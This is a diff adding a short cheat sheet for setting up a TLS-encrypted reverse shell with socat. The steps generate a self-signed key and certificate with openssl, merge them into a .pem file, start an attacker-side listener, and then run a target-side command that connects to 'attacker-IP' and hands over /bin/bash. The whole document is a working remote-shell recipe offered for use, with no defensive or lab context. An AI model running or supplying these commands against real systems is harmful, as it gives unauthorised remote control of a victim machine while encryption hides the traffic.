@@ -1,0 +1,15 @@
+1) Generate encryption key and ssl certificate with openssl: 
+
+	openssl req --newkey rsa:4096 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+
+2) Merge the key and the certificate files together to get the .pem file: 
+
+	cat shell.key shell.crt > shell.pem
+
+3) Setup your socat listener: 
+
+	socat OPENSSL-LISTEN:8080,cert=shell.pem,verify=0 -
+
+4) Connect back from a Linux target: 
+	
+	socat OPENSSL:attacker-IP:8080,verify=0 EXEC:/bin/bash
